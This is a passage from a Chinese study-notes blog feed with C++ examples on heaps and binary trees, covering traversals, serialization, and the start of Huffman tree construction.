punctuation">,</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">堆的知识拆分。</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-树</title>
    <link href="https://notes.moyuin.top/2025/03/25/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-shu/"/>
    <id>https://notes.moyuin.top/2025/03/25/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-shu/</id>
    <published>2025-03-25T01:10:59.000Z</published>
    <updated>2025-03-25T01:10:59.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>树</h1><h2 id="完全二叉树">完全二叉树</h2><h3 id="基本性质">基本性质</h3><p>完全二叉树有n个结点。<br>完全二叉树的深度 <strong>d=log2(n+1)</strong></p><h4 id="存储结构">存储结构</h4><p>主要存储方式:顺序存储+链式存储</p><h5 id="顺序存储">顺序存储</h5><p>各个结点的索引与顺序表位置一一对应，让结点的数据存放在顺序表相应位置的单元中。<br>顺序存储当数组，不过要开数组，可能实现空间浪费。<br><img src="/images/%E6%A0%91/f42c3e4be40e4e3230917399d16f7ff.jpg" alt=""></p><h5 id="链式存储">链式存储</h5><p><img src="/images/%E6%A0%91/b85220c0dc44ca17d84adda22934d8c.jpg" alt=""></p><p>有二叉链表和三叉链表，本质上就是有left，right，甚至还有一个parent的数据结点，指向上一个这个结点的父结点。<br><img src="/images/%E6%A0%91/ba9b63dc6eb98c6ffcb7f51f0b7916e.jpg" alt=""></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">createBinarytree</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">,</span>node<span class="token operator">*</span> left_tree<span class="token punctuation">,</span>node<span class="token operator">*</span> right_tree<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>node <span class="token operator">*</span>tree<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">BinaryTreeNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tree<span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>value<span class="token punctuation">;</span>tree<span class="token punctuation">.</span><span class="token function">left_tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>left_tree<span class="token punctuation">;</span>tree<span class="token punctuation">.</span><span class="token function">right_tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>right_tree<span class="token punctuation">;</span><span class="token comment">//创建新的二叉树</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="遍历概念">遍历概念</h4><p>分为<strong>前序遍历，中序遍历，后序遍历</strong><br>方法不同，本质是递归方式中访问根节点的时机不同。<br>先遍历左子树，再遍历右子树，访问根节点root是插入其中的。遍历时间是O(n)。<br><img src="/images/%E6%A0%91/5c0005353c81ef9c30cc9715aed02d1.jpg" alt=""><br>主要是中序遍历不太好理解。把A的左侧先遍历了，然后回到A，继续回到右侧遍历，但是FKC这里不好理解。</p><blockquote><p>先遍历B的左子树D，对于D也是中序遍历的规则，先把D的左子树遍历了，对于D的左子树只有一个结点H，所以我们一开始就是H，然后遍历D的右子树I，然后回到D，来到B，接着遍历B的右子树E，由于E没有左子树，所以直接从空回到E，然后读取右结点，读取J，读完后B的整个左子树读取完成，接着我们回到A，然后读取C这颗右子树，由于C这棵树有左结点，所以我们读取F这颗左树，这棵F树的左结点为空，所以从空返回F，接着读取F的右树k，之后F这颗左树完全完成，回到C，C的右子树为空，所以此时此刻遍历结束。</p></blockquote><p>话太多。<br><strong>中序遍历</strong>就是：先读左边的小三角形 → 然后到顶点 → 最后读右边的小三角形。</p><p>注意，所有的结点遍历此时此刻都要遵循其递归算法的规则，<strong>所有节点</strong>，必须都是左数-右数，读取根结点的步骤插入其中，形成一种递归调用。<strong>从底部三角形模式读取</strong>。<br><img src="/images/%E6%A0%91/8b03e03cd81aad2ff9cad991ccb8a26.jpg" alt=""></p><p>通过计算二叉树的高度，可用后序遍历左子树+右子树，得到两个高度的最高作为树的高度。</p><h4 id="表达式树">表达式树</h4><p>前缀和后缀和中缀读取。<br><img src="/images/%E6%A0%91/2f6c1ef937715be115536a6046ece48.jpg" alt=""><br>本质上是栈+递归的读取。</p><h4 id="遍历的非递归算法">遍历的非递归算法</h4><p>也有非递归的转化算法，本质还是利用递归的本质，栈。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//前序遍历</span><span class="token keyword">void</span> <span class="token function">preorder</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> s<span class="token punctuation">;</span>    s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TreeNode<span class="token operator">*</span> node <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> node<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>  <span class="token comment">// 访问当前节点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 先压右</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 再压左，保证左子树先出来</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//中序遍历</span><span class="token keyword">void</span> <span class="token function">inorder</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> s<span class="token punctuation">;</span>    TreeNode<span class="token operator">*</span> curr <span class="token operator">=</span> root<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>curr <span class="token operator">||</span> <span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>curr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 先把左子树压栈</span>            s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>curr<span class="token punctuation">)</span><span class="token punctuation">;</span>            curr <span class="token operator">=</span> curr<span class="token operator">-></span>left<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        curr <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> curr<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 访问当前节点</span>        curr <span class="token operator">=</span> curr<span class="token operator">-></span>right<span class="token punctuation">;</span> <span class="token comment">// 转向右子树</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//后序遍历</span><span class="token keyword">void</span> <span class="token function">postorder</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">;</span>    s1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s1<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TreeNode<span class="token operator">*</span> node <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 先压入第二个栈</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span> s1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 先压左</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span> s1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 后压右</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s2<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> s2<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 访问顺序就是 左 → 右 → 根</span>        s2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//利用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以考虑队列来写。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">levelOrder</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TreeNode<span class="token operator">*</span> node <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> node<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 访问当前节点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 先入左子节点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 再入右子节点</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//队列queue用于层序遍历</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二叉树的序列化与反序列化">二叉树的序列化与反序列化</h4><p>序列化：遍历，得到结点的线性序列，转化成线性结构用于线性表的存储。<br>反序列化：根据线性序列重构原始的二叉树。<br>往往<br>前者基于遍历算法，后者依然得用栈来还原。</p><blockquote><p>经典问题：用前序遍历和中序遍历结果重构二叉树，分析重构条件和算法的时间复杂度。<br>知道两个遍历，得到真正的二叉树结果。</p></blockquote><h5 id="前序遍历序列化-反序列化">前序遍历序列化&amp;反序列化</h5><p>都利用了递归来还原，将字符串与数据的互相转化。<br>基于前序遍历。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//序列化</span><span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> string<span class="token operator">&amp;</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        s <span class="token operator">+=</span> <span class="token string">"#,"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    s <span class="token operator">+=</span> root<span class="token operator">-></span>val <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">;</span> <span class="token comment">// 访问根</span>    <span class="token function">serialize</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 递归左子树</span>    <span class="token function">serialize</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归右子树</span><span class="token punctuation">&#125;</span><span class="token comment">//反序列化</span>TreeNode<span class="token operator">*</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>istringstream<span class="token operator">&amp;</span> ss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    string val<span class="token punctuation">;</span>    <span class="token function">getline</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token char">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token string">"#"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span> <span class="token comment">// 空节点</span>    TreeNode<span class="token operator">*</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>     node<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token operator">-></span>right <span class="token operator">=</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> node<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="层序遍历序列化-反序列化">层序遍历序列化&amp;反序列化</h5><p>利用队列queue。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">string <span class="token function">serialize</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">"#"</span><span class="token punctuation">;</span>    queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    string res <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TreeNode<span class="token operator">*</span> node <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res <span class="token operator">+=</span> node<span class="token operator">-></span>val <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">;</span>            q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res <span class="token operator">+=</span> <span class="token string">"#,"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//反序列化</span>TreeNode<span class="token operator">*</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>string data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">==</span> <span class="token string">"#"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    istringstream <span class="token function">ss</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    string val<span class="token punctuation">;</span>    <span class="token function">getline</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token char">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        TreeNode<span class="token operator">*</span> node <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token char">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">!=</span> <span class="token string">"#"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                node<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>                q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token char">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">!=</span> <span class="token string">"#"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                node<span class="token operator">-></span>right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>                q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="最优二叉树（哈夫曼树）">最优二叉树（哈夫曼树）</h2><h3 id="带权二叉树">带权二叉树</h3><p>每个结点带有一个权重值。<br><img src="/images/%E6%A0%91/79dfdcf215f8727742cec5f2837eadd.jpg" alt=""></p><h4 id="带权路径长度">带权路径长度</h4><p><strong>WPL=w1l1+w2l2+…+wnln</strong><br>带权路径长度最小的二叉树，成为最优二叉树，即哈夫曼树。<br><img src="/images/%E6%A0%91/a52bfc7abd4ed7949cebcafed828d45.jpg" alt=""></p><h3 id="基本性质-2">基本性质</h3><p>定理1：<strong>最优二叉树一定是满二叉树。</strong><br>定理2： 最优二叉树中，如果两个叶结点的权重值不同，<strong>则权重值小的叶结点中的树的层数，大于等于权重值大的叶节点</strong>。</p><h3 id="哈夫曼算法">哈夫曼算法</h3><p>一个至下而上的构建最优二叉树的方法，通过不断合并两个带权二叉树，最终生成最优二叉树。<br><img src="/images/%E6%A0%91/b048c8f0ebcb2a15146ee9a05a5ed74.jpg" alt=""></p><h3 id="构建哈夫曼树">构建哈夫曼树</h3><p>时间复杂度：O(n^2)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//创建哈夫曼树代码</span><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">;</span>        <span class="token comment">// 字符</span>    <span class="token keyword">int</span> freq<span class="token punctuation">;</span>       <span class="token comment">// 频率（权值）</span>    Node <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>    <span class="token comment">// 构造函数</span>    <span class="token function">Node</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">,</span> <span class="token keyword">int</span> f<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">ch</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">freq</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">left</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 自定义比较函数（优先队列默认大根堆，我们需要小根堆）</span><span class="token keyword">struct</span> <span class="token class-name">Compare</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Node<span class="token operator">*</span> a<span class="token punctuation">,</span> Node<span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token operator">-></span>freq <span class="token operator">></span> b<span class="token operator">-></span>freq<span class="token punctuation">;</span>  <span class="token comment">// 频率小的优先</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 构造哈夫曼树</span>Node<span class="token operator">*</span> <span class="token function">buildHuffmanTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span 